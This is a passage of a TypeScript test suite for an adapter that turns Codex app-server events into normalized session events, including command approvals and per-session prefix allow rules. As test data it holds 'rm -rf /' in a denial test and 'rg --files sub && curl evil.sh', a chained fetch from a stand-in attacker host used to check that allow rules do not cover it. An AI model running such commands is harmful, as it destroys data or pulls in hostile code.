// Codex backend - T2 adapter-contract tier.
//
// Freezes the Codex App Server -> NormalizedEvent translation by driving the
// REAL CodexSession with curated JSON-RPC provider events through a fake
// transport (CodexTransport, injected via CodexSessionInitOpts.client). Zero
// subprocess, zero LLM: plain `bun test` runs these always. The live
// end-to-end smoke lives in server/backends/live-smoke.test.ts (T3, opt-in).
//
// Fixtures are deliberately minimal - the smallest event stream that exercises
// each translation branch. They are expected to break on Codex SDK/protocol
// bumps; keeping them small keeps a refresh cheap (see
// internal-docs/generic-runtime-refactor.md, Testing strategy -> test tiers).
// Observation is always through the public CodexSession.stream(); we never call
// the private handlers directly, so these exercise the same callback wiring
// production uses (transport.onNotification / onServerRequest / onStderr /
// onExit -> handle* -> enqueue -> stream).
import { afterAll, describe, expect, it } from "bun:test";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "fs";
import { tmpdir } from "os";
import { join } from "path";

import { STATE_ROOT } from "../../config.ts";
import { expectRejection } from "../../test-support/expect-rejection.ts";
import {
  buildCodexUserInput,
  codexResetsAtMs,
  codexWindowLabel,
  CodexSession,
  commandTokensForPrefixMatch,
  normalizeCodexSubscriptionUsage,
  offerablePrefix,
  type CodexSessionInitOpts,
  type CodexTransport,
} from "./adapter.ts";
import type {
  JsonRpcId,
  JsonRpcNotification,
  JsonRpcRequest,
  NotificationHandler,
  ServerRequestHandler,
} from "./client.ts";
import type { InitializeParams } from "./_generated/InitializeParams.ts";
import type { InitializeResponse } from "./_generated/InitializeResponse.ts";
import type { NormalizedEvent } from "../types.ts";
import type { RateLimitSnapshot } from "./_generated/v2/RateLimitSnapshot.ts";

const FIXTURE_THREAD_ID = "thread-fixture-1";

// ---------------------------------------------------------------------------
// FakeCodexTransport - curated-event driver for the real adapter.
//
// Implements ONLY the production CodexTransport surface. The fire* / record
// helpers below are test-only and intentionally kept off the interface so the
// production contract stays clean.
// ---------------------------------------------------------------------------
class FakeCodexTransport implements CodexTransport {
  started = false;
  closed = false;
  threadId = FIXTURE_THREAD_ID;
  // When set, request("thread/start") rejects so we can exercise the
  // bootstrap-failure deferral path.
  bootstrapError: Error | null = null;
  // account/rateLimits/read: resolves with this payload, or rejects when the
  // error is set (unauthenticated / API-key-only logins).
  rateLimitsReadResponse: unknown = null;
  rateLimitsReadError: Error | null = null;
  // When set, the read parks until releaseRateLimitsRead() - lets a test slip
  // a notification in while the request is in flight.
  holdRateLimitsRead = false;
  private rateLimitsReadGate: (() => void) | null = null;
  readonly requests: { method: string; params?: unknown }[] = [];
  readonly errorResponses: {
    id: JsonRpcId;
    code: number;
    message: string;
  }[] = [];

  private notificationHandler: NotificationHandler | null = null;
  private serverRequestHandler: ServerRequestHandler | null = null;
  private stderrHandler: ((chunk: string) => void) | null = null;
  private exitHandler:
    | ((code: number | null, signal: NodeJS.Signals | null) => void)
    | null = null;

  // ----- CodexTransport (production surface) -----
  start(): void {
    this.started = true;
  }

  initialize(_params: InitializeParams): Promise<InitializeResponse> {
    return Promise.resolve({
      userAgent: "fake-codex",
      codexHome: "/tmp/fake-codex-home",
      platformFamily: "unix",
      platformOs: "linux",
    });
  }

  request<T = unknown>(method: string, params?: unknown): Promise<T> {
    this.requests.push({ method, params });
    if (method === "thread/start" || method === "thread/resume") {
      if (this.bootstrapError) return Promise.reject(this.bootstrapError);
      return Promise.resolve({ thread: { id: this.threadId } } as T);
    }
    if (method === "account/rateLimits/read") {
      if (this.rateLimitsReadError)
        return Promise.reject(this.rateLimitsReadError);
      if (!this.holdRateLimitsRead) {
        return Promise.resolve(this.rateLimitsReadResponse as T);
      }
      return new Promise<T>((resolve) => {
        this.rateLimitsReadGate = () =>
          resolve(this.rateLimitsReadResponse as T);
      });
    }
    // turn/start, turn/interrupt, etc.: resolve with an empty payload.
    return Promise.resolve({} as T);
  }

  respondWithError(id: JsonRpcId, code: number, message: string): void {
    this.errorResponses.push({ id, code, message });
  }

  onNotification(handler: NotificationHandler): () => void {
    this.notificationHandler = handler;
    return () => {
      this.notificationHandler = null;
    };
  }

  onServerRequest(handler: ServerRequestHandler): () => void {
    this.serverRequestHandler = handler;
    return () => {
      this.serverRequestHandler = null;
    };
  }

  onStderr(handler: (chunk: string) => void): () => void {
    this.stderrHandler = handler;
    return () => {
      this.stderrHandler = null;
    };
  }

  onExit(
    handler: (code: number | null, signal: NodeJS.Signals | null) => void,
  ): () => void {
    this.exitHandler = handler;
    return () => {
      this.exitHandler = null;
    };
  }

  close(): Promise<void> {
    this.closed = true;
    return Promise.resolve();
  }

  // ----- test drivers (NOT part of CodexTransport) -----
  fireNotification(method: string, params?: unknown): void {
    if (!this.notificationHandler) throw new Error("no notification handler");
    const n: JsonRpcNotification = {
      method,
      ...(params !== undefined ? { params } : {}),
    };
    this.notificationHandler(n);
  }

  fireServerRequest(req: JsonRpcRequest): Promise<unknown> {
    if (!this.serverRequestHandler)
      throw new Error("no server-request handler");
    return this.serverRequestHandler(req);
  }

  fireStderr(chunk: string): void {
    if (!this.stderrHandler) throw new Error("no stderr handler");
    this.stderrHandler(chunk);
  }

  fireExit(code: number | null, signal: NodeJS.Signals | null = null): void {
    if (!this.exitHandler) throw new Error("no exit handler");
    this.exitHandler(code, signal);
  }

  rateLimitsReadParked(): boolean {
    return this.rateLimitsReadGate !== null;
  }

  releaseRateLimitsRead(): void {
    const gate = this.rateLimitsReadGate;
    this.rateLimitsReadGate = null;
    gate?.();
  }

  interruptCount(): number {
    return this.requests.filter((r) => r.method === "turn/interrupt").length;
  }
}

// ---------------------------------------------------------------------------
// Harness helpers
// ---------------------------------------------------------------------------
const DEFAULT_OPTS = {
  agentId: "test-agent",
  cwd: "/tmp",
  systemPrompt: "",
  modelFamily: "gpt-5.5",
  effort: "",
  permissionMode: "on-request",
};

// Sessions are closed in afterAll so their stream() generators unblock; temp
// source dirs (image fixtures) are removed there too.
const liveSessions: CodexSession[] = [];
const tempDirs: string[] = [];
afterAll(() => {
  for (const s of liveSessions) {
    try {
      s.close();
    } catch {
      // ignore
    }
  }
  for (const d of tempDirs) {
    try {
      rmSync(d, { recursive: true, force: true });
    } catch {
      // ignore
    }
  }
});

function start(
  fake: FakeCodexTransport = new FakeCodexTransport(),
  overrides: Partial<CodexSessionInitOpts> = {},
): {
  session: CodexSession;
  fake: FakeCodexTransport;
  it: AsyncIterator<NormalizedEvent>;
} {
  const session = new CodexSession({
    ...DEFAULT_OPTS,
    ...overrides,
    client: fake,
  });
  liveSessions.push(session);
  return { session, fake, it: session.stream() };
}

// Advance past bootstrap (consume system_init) and return the live iterator.
async function bootstrapped(
  fake?: FakeCodexTransport,
  overrides?: Partial<CodexSessionInitOpts>,
): Promise<{
  session: CodexSession;
  fake: FakeCodexTransport;
  it: AsyncIterator<NormalizedEvent>;
}> {
  const ctx = start(fake, overrides);
  expectKind(await nextEvent(ctx.it, "system_init"), "system_init");
  return ctx;
}

// Fire an `item/completed` notification carrying a ThreadItem (the most common
// fixture). `threadId` exercises the per-thread filter when set.
function fireItem(
  fake: FakeCodexTransport,
  item: Record<string, unknown>,
  threadId?: string,
): void {
  fake.fireNotification(
    "item/completed",
    threadId !== undefined ? { item, threadId } : { item },
  );
}

// Read the next event with a timeout so a missing event fails fast and legibly
// instead of hanging the suite. Everything the fake fires is synchronous, so
// real events arrive within microtasks; the 2s budget is pure safety margin.
async function nextEvent(
  it: AsyncIterator<NormalizedEvent>,
  label: string,
): Promise<NormalizedEvent> {
  let timer: ReturnType<typeof setTimeout> | undefined;
  const timeout = new Promise<never>((_, reject) => {
    timer = setTimeout(
      () => reject(new Error(`timed out waiting for ${label}`)),
      2000,
    );
  });
  try {
    const r = await Promise.race([it.next(), timeout]);
    if (r.done) throw new Error(`stream ended while waiting for ${label}`);
    return r.value;
  } finally {
    if (timer) clearTimeout(timer);
  }
}

// Assert the discriminant and narrow in one step.
function expectKind<K extends NormalizedEvent["kind"]>(
  ev: NormalizedEvent,
  kind: K,
): Extract<NormalizedEvent, { kind: K }> {
  expect(ev.kind).toBe(kind);
  return ev as Extract<NormalizedEvent, { kind: K }>;
}

// ---------------------------------------------------------------------------
// Bootstrap / system_init
// ---------------------------------------------------------------------------
describe("CodexSession bootstrap", () => {
  it("fresh start: initialize + thread/start, emits system_init with thread id", async () => {
    const { fake, it } = start();
    const init = expectKind(await nextEvent(it, "system_init"), "system_init");
    expect(init.sessionId).toBe(FIXTURE_THREAD_ID);
    expect(init.model).toBe("gpt-5.5");
    expect(init.slashCommands).toEqual([]);
    expect(fake.started).toBe(true);
    expect(fake.requests.map((r) => r.method)).toEqual(["thread/start"]);
  });

  it("resume: uses thread/resume and surfaces the resumed thread id", async () => {
    const fake = new FakeCodexTransport();
    fake.threadId = "resumed-thread-9";
    const { it } = start(fake, { resumeThreadId: "resumed-thread-9" });
    const init = expectKind(await nextEvent(it, "system_init"), "system_init");
    expect(init.sessionId).toBe("resumed-thread-9");
    expect(fake.requests.map((r) => r.method)).toEqual(["thread/resume"]);
  });

  it("bootstrap failure defers: system_init with empty id, send() rejects with the captured error", async () => {
    const fake = new FakeCodexTransport();
    fake.bootstrapError = new Error("401 Unauthorized: please log in");
    const { session, it } = start(fake);
    // The agent still looks idle from spawn: system_init lands (empty id), so
    // the orchestrator transitions to idle rather than pre-init.
    const init = expectKind(await nextEvent(it, "system_init"), "system_init");
    expect(init.sessionId).toBe("");
    // The actionable error surfaces on the first send, not at spawn.
    await expectRejection(session.send("hi"), /401 Unauthorized/);
  });
});

// ---------------------------------------------------------------------------
// Assistant text / reasoning
// ---------------------------------------------------------------------------
describe("CodexSession item translation - text & thinking", () => {
  it("agentMessage -> assistant_text; empty text is dropped", async () => {
    const { fake, it } = await bootstrapped();
    fireItem(fake, { type: "agentMessage", text: "" });
    fireItem(fake, { type: "agentMessage", text: "Hello there" });
    // The empty one produced nothing, so the next event is the real message.
    const ev = expectKind(
      await nextEvent(it, "assistant_text"),
      "assistant_text",
    );
    expect(ev.text).toBe("Hello there");
  });

  it("reasoning -> thinking (summary + content joined)", async () => {
    const { fake, it } = await bootstrapped();
    fireItem(fake, {
      type: "reasoning",
      summary: ["short summary"],
      content: ["the body"],
    });
    const ev = expectKind(await nextEvent(it, "thinking"), "thinking");
    expect(ev.text).toBe("short summary\n\nthe body");
  });

  it("plan item -> thinking", async () => {
    const { fake, it } = await bootstrapped();
    fireItem(fake, { type: "plan", text: "1. do the thing" });
    const ev = expectKind(await nextEvent(it, "thinking"), "thinking");
    expect(ev.text).toBe("1. do the thing");
  });
});

// ---------------------------------------------------------------------------
// Tool calls (each emits a tool_call then a tool_result)
// ---------------------------------------------------------------------------
describe("CodexSession item translation - tool calls", () => {
  it("commandExecution -> Bash tool_call + tool_result, exit 0 not an error", async () => {
    const { fake, it } = await bootstrapped();
    fireItem(fake, {
      type: "commandExecution",
      id: "cmd-1",
      command: "ls -la",
      cwd: "/work",
      aggregatedOutput: "total 0\n",
      exitCode: 0,
      durationMs: 7,
    });
    const call = expectKind(await nextEvent(it, "tool_call"), "tool_call");
    expect(call.toolUseId).toBe("cmd-1");
    expect(call.name).toBe("Bash");
    expect(call.input).toEqual({ command: "ls -la", cwd: "/work" });
    const result = expectKind(
      await nextEvent(it, "tool_result"),
      "tool_result",
    );
    expect(result.toolUseId).toBe("cmd-1");
    expect(result.content).toBe("total 0\n\n(exit code 0)");
    expect(result.durationMs).toBe(7);
    expect(result.isError).toBe(false);
  });

  it("commandExecution with nonzero exit -> tool_result isError", async () => {
    const { fake, it } = await bootstrapped();
    fireItem(fake, {
      type: "commandExecution",
      id: "cmd-2",
      command: "false",
      cwd: "/work",
      aggregatedOutput: "",
      exitCode: 2,
    });
    expectKind(await nextEvent(it, "tool_call"), "tool_call");
    const result = expectKind(
      await nextEvent(it, "tool_result"),
      "tool_result",
    );
    expect(result.content).toBe("\n(exit code 2)");
    expect(result.isError).toBe(true);
  });

  it("fileChange -> Edit tool_call + tool_result; non-applied status is an error", async () => {
    const { fake, it } = await bootstrapped();
    fireItem(fake, {
      type: "fileChange",
      id: "fc-1",
      changes: [{ path: "src/a.ts", kind: { type: "update" } }],
      status: "completed",
    });
    const call = expectKind(await nextEvent(it, "tool_call"), "tool_call");
    expect(call.toolUseId).toBe("fc-1");
    expect(call.name).toBe("Edit");
    const okResult = expectKind(
      await nextEvent(it, "tool_result"),
      "tool_result",
    );
    expect(okResult.content).toContain("src/a.ts");
    expect(okResult.content).toContain("status: completed");
    expect(okResult.isError).toBe(false);

    fireItem(fake, {
      type: "fileChange",
      id: "fc-2",
      changes: [{ path: "src/b.ts", kind: { type: "update" } }],
      status: "rejected",
    });
    expectKind(await nextEvent(it, "tool_call"), "tool_call");
    const badResult = expectKind(
      await nextEvent(it, "tool_result"),
      "tool_result",
    );
    expect(badResult.isError).toBe(true);
  });

  it("mcpToolCall -> mcp__server__tool tool_call + JSON result", async () => {
    const { fake, it } = await bootstrapped();
    fireItem(fake, {
      type: "mcpToolCall",
      id: "mcp-1",
      server: "memory",
      tool: "search",
      arguments: { query: "x" },
      result: { content: [{ type: "text", text: "3 hits" }] },
      durationMs: 4,
    });
    const call = expectKind(await nextEvent(it, "tool_call"), "tool_call");
    expect(call.name).toBe("mcp__memory__search");
    expect(call.input).toEqual({ query: "x" });
    const result = expectKind(
      await nextEvent(it, "tool_result"),
      "tool_result",
    );
    expect(result.content).toBe(
      JSON.stringify({ content: [{ type: "text", text: "3 hits" }] }),
    );
    expect(result.isError).toBe(false);

    fireItem(fake, {
      type: "mcpToolCall",
      id: "mcp-2",
      server: "memory",
      tool: "search",
      error: { message: "boom" },
    });
    expectKind(await nextEvent(it, "tool_call"), "tool_call");
    const errResult = expectKind(
      await nextEvent(it, "tool_result"),
      "tool_result",
    );
    expect(errResult.content).toContain("Error:");
    expect(errResult.isError).toBe(true);
  });

  it("webSearch -> WebSearch tool_call + formatted action summary", async () => {
    const { fake, it } = await bootstrapped();
    fireItem(fake, {
      type: "webSearch",
      id: "ws-1",
      query: "isomux",
      action: { type: "search", query: "isomux" },
    });
    const call = expectKind(await nextEvent(it, "tool_call"), "tool_call");
    expect(call.name).toBe("WebSearch");
    expect(call.input).toEqual({ query: "isomux" });
    const result = expectKind(
      await nextEvent(it, "tool_result"),
      "tool_result",
    );
    expect(result.content).toBe("search: isomux");
    expect(result.isError).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// Turn lifecycle
// ---------------------------------------------------------------------------
describe("CodexSession turn lifecycle", () => {
  it("turn/completed completed -> turn_completed completed", async () => {
    const { fake, it } = await bootstrapped();
    fake.fireNotification("turn/completed", { turn: { status: "completed" } });
    const ev = expectKind(
      await nextEvent(it, "turn_completed"),
      "turn_completed",
    );
    expect(ev.status).toBe("completed");
    expect(ev.error).toBeUndefined();
    expect(ev.causedByAuth).toBeUndefined();
  });

  it("turn/completed interrupted -> turn_completed interrupted", async () => {
    const { fake, it } = await bootstrapped();
    fake.fireNotification("turn/completed", {
      turn: { status: "interrupted" },
    });
    const ev = expectKind(
      await nextEvent(it, "turn_completed"),
      "turn_completed",
    );
    expect(ev.status).toBe("interrupted");
  });

  it("turn/completed failed -> turn_completed failed with the turn error", async () => {
    const { fake, it } = await bootstrapped();
    fake.fireNotification("turn/completed", {
      turn: { status: "failed", error: { message: "model exploded" } },
    });
    const ev = expectKind(
      await nextEvent(it, "turn_completed"),
      "turn_completed",
    );
    expect(ev.status).toBe("failed");
    expect(ev.error).toBe("model exploded");
  });

  it("missing/unknown status defaults to failed", async () => {
    const { fake, it } = await bootstrapped();
    fake.fireNotification("turn/completed", { turn: {} });
    const ev = expectKind(
      await nextEvent(it, "turn_completed"),
      "turn_completed",
    );
    expect(ev.status).toBe("failed");
  });
});

// ---------------------------------------------------------------------------
// Token usage: cumulative -> delta, and the /context snapshot (last breakdown)
// ---------------------------------------------------------------------------
describe("CodexSession token usage", () => {
  it("emits usage_update deltas against the running cumulative", async () => {
    const { session, fake, it } = await bootstrapped();
    fake.fireNotification("thread/tokenUsage/updated", {
      threadId: FIXTURE_THREAD_ID,
      turnId: "t1",
      tokenUsage: {
        total: {
          totalTokens: 150,
          inputTokens: 100,
          cachedInputTokens: 20,
          outputTokens: 50,
          reasoningOutputTokens: 10,
        },
        last: {
          totalTokens: 130,
          inputTokens: 90,
          cachedInputTokens: 15,
          outputTokens: 40,
          reasoningOutputTokens: 5,
        },
        modelContextWindow: 200000,
      },
    });
    const u1 = expectKind(await nextEvent(it, "usage_update"), "usage_update");
    expect(u1.tokenUsage).toEqual({
      inputTokens: 80, // 100 - 20 cached
      outputTokens: 50,
      cacheReadInputTokens: 20,
      cacheCreationInputTokens: 0,
    });

    // /context snapshot uses `last` (current context fullness), not `total`.
    const ctx = await session.getContextUsage();
    expect(ctx).not.toBeNull();
    expect(ctx!.totalTokens).toBe(130); // last.input(90) + last.output(40)
    expect(ctx!.maxTokens).toBe(200000);
    expect(ctx!.categories?.length).toBe(4);

    // Second cumulative -> delta against the first.
    fake.fireNotification("thread/tokenUsage/updated", {
      threadId: FIXTURE_THREAD_ID,
      turnId: "t2",
      tokenUsage: {
        total: {
          totalTokens: 500,
          inputTokens: 300,
          cachedInputTokens: 50,
          outputTokens: 120,
          reasoningOutputTokens: 30,
        },
        last: {
          totalTokens: 250,
          inputTokens: 180,
          cachedInputTokens: 25,
          outputTokens: 70,
          reasoningOutputTokens: 10,
        },
        modelContextWindow: 200000,
      },
    });
    const u2 = expectKind(await nextEvent(it, "usage_update"), "usage_update");
    expect(u2.tokenUsage).toEqual({
      inputTokens: 170, // (300-50) - 80
      outputTokens: 70, // 120 - 50
      cacheReadInputTokens: 30, // 50 - 20
      cacheCreationInputTokens: 0,
    });
  });
});

// ---------------------------------------------------------------------------
// Compaction / errors / warnings / per-thread filter
// ---------------------------------------------------------------------------
describe("CodexSession misc notifications", () => {
  // The wire type (ContextCompactedNotification) is { threadId, turnId } - there
  // is no `summary` field, so the adapter emits the bare compacted marker (the
  // dead params.summary read was removed, 9fc5d488); summary stays undefined.
  it("thread/compacted -> compacted (no summary on the wire)", async () => {
    const { fake, it } = await bootstrapped();
    fake.fireNotification("thread/compacted", {
      threadId: FIXTURE_THREAD_ID,
      turnId: "t1",
    });
    const ev = expectKind(await nextEvent(it, "compacted"), "compacted");
    expect(ev.summary).toBeUndefined();
  });

  it("contextCompaction item -> compacted", async () => {
    const { fake, it } = await bootstrapped();
    fireItem(fake, { type: "contextCompaction" });
    expectKind(await nextEvent(it, "compacted"), "compacted");
  });

  // ErrorNotification carries its text at params.error.message (TurnError), not
  // params.message. The adapter now reads the correct field (both the streaming
  // arm and the one-shot path), so a real error notification surfaces as an
  // `error` event instead of being silently swallowed.
  it("error notification (real wire shape) -> error event from params.error.message", async () => {
    const { fake, it } = await bootstrapped();
    fake.fireNotification("error", {
      error: { message: "stream broke" },
      willRetry: false,
      threadId: FIXTURE_THREAD_ID,
      turnId: "t1",
    });
    const ev = expectKind(await nextEvent(it, "error"), "error");
    expect(ev.message).toBe("stream broke");
  });

  it("warning-family notification -> tagged system_text", async () => {
    const { fake, it } = await bootstrapped();
    fake.fireNotification("warning", { message: "heads up" });
    const ev = expectKind(await nextEvent(it, "system_text"), "system_text");
    expect(ev.text).toBe("[warning] heads up");
  });

  it("model/rerouted -> system_text built from fromModel/toModel/reason (5acf4941)", async () => {
    const { fake, it } = await bootstrapped();
    fake.fireNotification("model/rerouted", {
      threadId: FIXTURE_THREAD_ID,
      turnId: "t1",
      fromModel: "gpt-5-codex",
      toModel: "gpt-5",
      reason: "highRiskCyberActivity",
    });
    const ev = expectKind(await nextEvent(it, "system_text"), "system_text");
    expect(ev.text).toBe(
      "[model/rerouted] model rerouted from gpt-5-codex to gpt-5 (highRiskCyberActivity)",
    );
  });

  it("deprecationNotice -> system_text from summary (+ details)", async () => {
    const { fake, it } = await bootstrapped();
    fake.fireNotification("deprecationNotice", {
      summary: "tool foo is deprecated",
      details: "use bar instead",
    });
    const ev = expectKind(await nextEvent(it, "system_text"), "system_text");
    expect(ev.text).toBe(
      "[deprecationNotice] tool foo is deprecated (use bar instead)",
    );
  });

  it("configWarning -> system_text; an auth-shaped one still surfaces (NOT via the auth funnel)", async () => {
    const { fake, it } = await bootstrapped();
    // The summary carries auth-shaped tokens (openai_api_key + 401). If this
    // were routed through enqueueAuthAwareSystemText, the per-turn auth gate
    // (authSignalsAllowedThisTurn=false outside a turn) would DROP it. A plain
    // enqueue must surface it as a normal advisory.
    fake.fireNotification("configWarning", {
      summary: "openai_api_key in config is malformed (401)",
      details: null,
    });
    const ev = expectKind(await nextEvent(it, "system_text"), "system_text");
    expect(ev.text).toBe(
      "[configWarning] openai_api_key in config is malformed (401)",
    );
  });

  it("notification for a foreign thread id is ignored", async () => {
    const { fake, it } = await bootstrapped();
    // A foreign-thread message would corrupt this session's stream if the
    // per-thread filter didn't drop it.
    fireItem(
      fake,
      { type: "agentMessage", text: "from another thread" },
      "other-thread",
    );
    fireItem(fake, { type: "agentMessage", text: "ours" });
    const ev = expectKind(
      await nextEvent(it, "assistant_text"),
      "assistant_text",
    );
    expect(ev.text).toBe("ours");
  });
});

// ---------------------------------------------------------------------------
// Approvals (server-initiated requests). Response enums differ between the
// legacy exec/patch methods and the v2 item/* methods, so cover one of each.
// ---------------------------------------------------------------------------
describe("CodexSession approvals", () => {
  it("execCommandApproval -> approval_request, approve/deny use the legacy enum", async () => {
    const { session, fake, it } = await bootstrapped();
    const allowResp = fake.fireServerRequest({
      id: "appr-1",
      method: "execCommandApproval",
      params: { command: ["echo", "hi"], cwd: "/work", reason: "demo" },
    });
    const ev = expectKind(
      await nextEvent(it, "approval_request"),
      "approval_request",
    );
    expect(ev.approvalId).toBe("appr-1");
    expect(ev.toolName).toBe("Bash");
    expect(ev.input).toEqual({
      command: "echo hi",
      cwd: "/work",
      reason: "demo",
    });
    expect(ev.title).toContain("echo hi");
    expect(ev.description).toBe("demo");
    await session.approve("appr-1", { kind: "allow_once" });
    expect(await allowResp).toEqual({ decision: "approved" });

    const denyResp = fake.fireServerRequest({
      id: "appr-1b",
      method: "execCommandApproval",
      params: { command: ["rm", "-rf", "/"], reason: "nope" },
    });
    expectKind(await nextEvent(it, "approval_request"), "approval_request");
    await session.approve("appr-1b", { kind: "deny", reason: "too risky" });
    expect(await denyResp).toEqual({ decision: "denied" });
  });

  it("item/fileChange/requestApproval -> approval_request, approve/deny use the v2 enum", async () => {
    const { session, fake, it } = await bootstrapped();
    const allowResp = fake.fireServerRequest({
      id: "appr-2",
      method: "item/fileChange/requestApproval",
      params: { itemId: "fc-1", reason: "apply patch" },
    });
    const ev = expectKind(
      await nextEvent(it, "approval_request"),
      "approval_request",
    );
    expect(ev.toolName).toBe("Edit");
    expect(ev.input).toEqual({ itemId: "fc-1", reason: "apply patch" });
    await session.approve("appr-2", { kind: "allow_once" });
    expect(await allowResp).toEqual({ decision: "accept" });

    const denyResp = fake.fireServerRequest({
      id: "appr-2b",
      method: "item/fileChange/requestApproval",
      params: { itemId: "fc-2" },
    });
    expectKind(await nextEvent(it, "approval_request"), "approval_request");
    await session.approve("appr-2b", { kind: "deny" });
    expect(await denyResp).toEqual({ decision: "decline" });
  });
});

// ---------------------------------------------------------------------------
// Session-scoped prefix allows ("stop asking me about `rg --files`").
//
// Shapes here mirror what codex 0.144.6 actually sends, captured off a live
// app-server: an exec approval carries `proposedExecpolicyAmendment` (the rule
// codex suggests) plus `commandActions` (the command as parsed for display).
// Two behaviours are load-bearing and worth freezing:
//   - we answer a granted prefix with a PLAIN accept. Sending codex's own
//     acceptWithExecpolicyAmendment back would make codex write the rule to
//     $CODEX_HOME/rules/default.rules - permanent, and shared by every codex
//     agent using that home.
//   - matching runs on the command text, not on the new request's suggestion.
//     Codex suggests a rule for only the FIRST segment of a chained command
//     (`mkdir -p g && whoami` suggests ["mkdir","-p","g"]), so matching on the
//     suggestion would wave through whatever was chained on the end.
// ---------------------------------------------------------------------------
function execApprovalParams(
  command: string,
  suggestion: string[] | null,
): Record<string, unknown> {
  return {
    threadId: FIXTURE_THREAD_ID,
    turnId: "turn-1",
    itemId: `item-${command}`,
    environmentId: "local",
    command: `/bin/bash -lc '${command}'`,
    cwd: "/work",
    commandActions: [{ type: "unknown", command }],
    ...(suggestion ? { proposedExecpolicyAmendment: suggestion } : {}),
  };
}

// Approvals a test deliberately never answers. Session teardown rejects the
// parked handler promise, and an unobserved rejection fails the whole run.
function ignoreUnanswered(p: Promise<unknown>): void {
  p.catch(() => {});
}

function fireExecApproval(
  fake: FakeCodexTransport,
  id: string,
  command: string,
  suggestion: string[] | null,
): Promise<unknown> {
  return fake.fireServerRequest({
    id,
    method: "item/commandExecution/requestApproval",
    params: execApprovalParams(command, suggestion),
  });
}

// Grant "anything starting with `rg --files`" and return the live session.
async function withGrantedPrefix() {
  const ctx = await bootstrapped();
  const resp = fireExecApproval(ctx.fake, "pfx-1", "rg --files .", [
    "rg",
    "--files",
  ]);
  const ev = expectKind(
    await nextEvent(ctx.it, "approval_request"),
    "approval_request",
  );
  expect(ev.allowPrefixLabel).toBe("rg --files");
  await ctx.session.approve("pfx-1", { kind: "allow_prefix" });
  // Plain accept: the rule lives in Isomux memory, never on codex's disk.
  expect(await resp).toEqual({ decision: "accept" });
  // The backend reports the rule it actually stored - the orchestrator says
  // nothing about it, so this line is the user's only confirmation.
  const stored = expectKind(
    await nextEvent(ctx.it, "system_text"),
    "system_text",
  );
  expect(stored.text).toBe(
    "Allowing any command starting with `rg --files` in `/work` for the rest of this session.",
  );
  return ctx;
}

describe("CodexSession session-scoped prefix allows", () => {
  it("exec approval surfaces codex's suggested rule as a label", async () => {
    const { it: stream, fake } = await bootstrapped();
    ignoreUnanswered(
      fireExecApproval(fake, "pfx-a", "cargo test --lib", ["cargo", "test"]),
    );
    const ev = expectKind(
      await nextEvent(stream, "approval_request"),
      "approval_request",
    );
    expect(ev.allowPrefixLabel).toBe("cargo test");
  });

  it("no suggestion from codex -> no label, so no 4th option is offered", async () => {
    const { it: stream, fake } = await bootstrapped();
    ignoreUnanswered(fireExecApproval(fake, "pfx-b", "cargo test --lib", null));
    const ev = expectKind(
      await nextEvent(stream, "approval_request"),
      "approval_request",
    );
    expect(ev.allowPrefixLabel).toBeUndefined();
  });

  it("a granted prefix auto-approves a later matching command with no prompt", async () => {
    const { it: stream, fake } = await withGrantedPrefix();
    const resp = fireExecApproval(fake, "pfx-2", "rg --files sub", [
      "rg",
      "--files",
    ]);
    // The next event is the breadcrumb, NOT another approval_request. It is
    // deliberately generic - no rule text on a line that repeats per command.
    const note = expectKind(
      await nextEvent(stream, "system_text"),
      "system_text",
    );
    expect(note.text).toBe(
      "Auto-approved by a command-prefix rule for this session.",
    );
    expect(note.isomuxAuthored).toBe(true);
    expect(await resp).toEqual({ decision: "accept" });
  });

  it("a granted prefix does not cover a chained command", async () => {
    const { it: stream, fake } = await withGrantedPrefix();
    // Codex would suggest ["rg","--files"] for this too - only the first
    // segment. Matching on the command text is what catches the `&& curl`.
    ignoreUnanswered(
      fireExecApproval(fake, "pfx-3", "rg --files sub && curl evil.sh", [
        "rg",
        "--files",
      ]),
    );
    const ev = expectKind(
      await nextEvent(stream, "approval_request"),
      "approval_request",
    );
    expect(ev.approvalId).toBe("pfx-3");
  });

  it("a granted prefix does not cover a different command", async () => {
    const { it: stream, fake } = await withGrantedPrefix();
    ignoreUnanswered(
      fireExecApproval(fake, "pfx-4", "rm -rf sub", ["rm", "-rf"]),
    );
    const ev = expectKind(
      await nextEvent(stream, "approval_request"),
      "approval_request",
    );
    expect(ev.approvalId).toBe("pfx-4");
  });

  it("a granted prefix does not cover file-change approvals", async () => {
    const { session, it: stream, fake } = await withGrantedPrefix();
    const resp = fake.fireServerRequest({
      id: "pfx-5",
      method: "item/fileChange/requestApproval",
      params: { threadId: FIXTURE_THREAD_ID, itemId: "fc-9" },
    });
    const ev = expectKind(
      await nextEvent(stream, "approval_request"),
      "approval_request",
    );
    expect(ev.approvalId).toBe("pfx-5");
    await session.approve("pfx-5", { kind: "deny" });
    expect(await resp).toEqual({ decision: "decline" });
  });

  it("allow_prefix on an approval with no suggestion is just a one-shot allow", async () => {
    const { session, it: stream, fake } = await bootstrapped();
    const resp = fireExecApproval(fake, "pfx-6", "rg --files .", null);
    expectKind(await nextEvent(stream, "approval_request"), "approval_request");
    await session.approve("pfx-6", { kind: "allow_prefix" });
    expect(await resp).toEqual({ decision: "accept" });
    // Nothing was remembered, so the same command asks again.
    ignoreUnanswered(fireExecApproval(fake, "pfx-7", "rg --files .", null));
    const ev = expectKind(
      await nextEvent(stream, "approval_request"),
      "approval_request",
    );
    expect(ev.approvalId).toBe("pfx-7");
  });

  it("a user-chosen prefix widens the rule along the same command", async () => {
    const { session, it: stream, fake } = await bootstrapped();
    // Codex 0.144.6 proposes the WHOLE command ("rg --files sub"), which would
    // only cover re-runs of that exact search. The user asks for the family.
    const resp = fireExecApproval(fake, "wide-1", "rg --files sub", [
      "rg",
      "--files",
      "sub",
    ]);
    expectKind(await nextEvent(stream, "approval_request"), "approval_request");
    await session.approve("wide-1", {
      kind: "allow_prefix",
      prefixText: "rg --files",
    });
    expect(await resp).toEqual({ decision: "accept" });
    const stored = expectKind(
      await nextEvent(stream, "system_text"),
      "system_text",
    );
    expect(stored.text).toBe(
      "Allowing any command starting with `rg --files` in `/work` for the rest of this session.",
    );
    // A different directory now runs without asking - the case that made this
    // whole feature worth building.
    const next = fireExecApproval(fake, "wide-2", "rg --files other/dir", [
      "rg",
      "--files",
      "other/dir",
    ]);
    expectKind(await nextEvent(stream, "system_text"), "system_text");
    expect(await next).toEqual({ decision: "accept" });
  });

  it("a user-chosen prefix that isn't the start of the command is refused", async () => {
    const { session, it: stream, fake } = await bootstrapped();
